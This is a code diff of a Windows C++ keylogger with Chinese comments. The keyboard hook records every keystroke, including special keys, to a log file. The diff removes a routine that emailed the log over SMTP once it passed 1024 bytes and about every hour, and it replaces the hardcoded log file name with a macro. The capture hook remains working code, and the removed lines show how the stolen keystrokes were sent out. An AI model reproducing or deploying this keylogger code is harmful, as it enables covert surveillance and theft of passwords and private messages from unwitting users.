@@ -3,12 +3,10 @@
 #include <time.h>
 
 
-bool sendMail();
+
 time_t lastTime;
-time_t routineTime;
-time_t returnTime;
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-	ofstream out("keys.txt", ios::out | ios::app);
+	ofstream out(KEYFILE, ios::out | ios::app);
 	if (time(NULL) - lastTime > 1)	//1秒间隔不输入插入换行符
 		out << endl;
 	//输出流，记录键值
@@ -17,19 +15,7 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (wParam == WM_KEYDOWN) {
 		//按键被按下
 		switch (p->vkCode) {
-		case VK_RETURN: out << "<ENTER>";	
-			{
-				HANDLE fd = CreateFile(L"keys.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-				WORD len = GetFileSize(fd, NULL);
-				CloseHandle(fd);
-				if (len > 1024) {
-					if (sendMail()) {
-						out.close();
-						ofstream out("keys.txt", ios::out);
-					}
-				}
-			};
-		break;
+		case VK_RETURN: out << "<ENTER>";break;
 		case VK_BACK: out << "<BK>" ; break;
 		case VK_TAB: out << "<TAB>" ; break;
 		case VK_CLEAR: out << "<CLEAR>" ; break;
@@ -151,13 +137,7 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 		default: break;
 		}
 	}
-	if (time(NULL) - routineTime > 3600)	//约一小时发送附带键盘记录文件邮件
-		if (sendMail()) {
-			out.close();
-			ofstream out("keys.txt", ios::out);
-			routineTime = time(NULL);
-		};
-	returnTime = time(NULL);
+
 
 	out.close(); //关闭流
 	lastTime = time(NULL);
@@ -170,8 +150,6 @@ KeyboardHook::KeyboardHook(HINSTANCE hInstance)
 {
 	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);
 	lastTime = time(NULL);
-	returnTime = time(NULL);
-	routineTime = time(NULL);
 }
 
 
@@ -179,10 +157,4 @@ KeyboardHook::~KeyboardHook()
 {
 }
 
-bool sendMail()
-{
-	CSmtp sendMail;
-	if (sendMail.Send())
-		return true;
-	return false;
-}
+
